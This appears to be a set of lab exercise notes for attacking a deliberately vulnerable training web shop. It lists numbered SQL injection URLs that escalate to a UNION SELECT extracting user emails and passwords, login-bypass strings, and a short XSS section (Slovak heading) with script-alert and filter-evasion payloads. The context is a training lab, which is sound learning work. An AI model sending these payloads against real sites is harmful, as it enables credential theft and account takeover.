## Open Firefox browser 
6. 
``` 
http://labs.training.local/rest/products/search?q= 
```
7. 
``` 
http://labs.training.local/rest/products/search?q=test’-- 
```
8. 
``` 
http://labs.training.local/rest/products/search?q=test’)) -- 
```
10. 
``` 
http://labs.training.local/rest/products/search?q=test’)) UNION SELECT * FROM Users --

http://labs.training.local/rest/products/search?q=test')) UNION SELECT '1', '2', '3', '4' FROM Users --
``` 
11. 
``` 
http://labs.training.local/rest/products/search?q=test')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users --
``` 
12. 
``` 
http://labs.training.local/rest/products/search?q=test')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users --
``` 
14. 
```
admin@juice-sh.op'--
```
15.
```
' or 1=1-- 
```

# Útok so zneužitím XSS
4. 
```
<script>alert(`xss`)</script> 
```
5. 
```
<<a|ascript>alert(`xss`)</script> 
```
6. 
```
<script>123456789</script> 
```
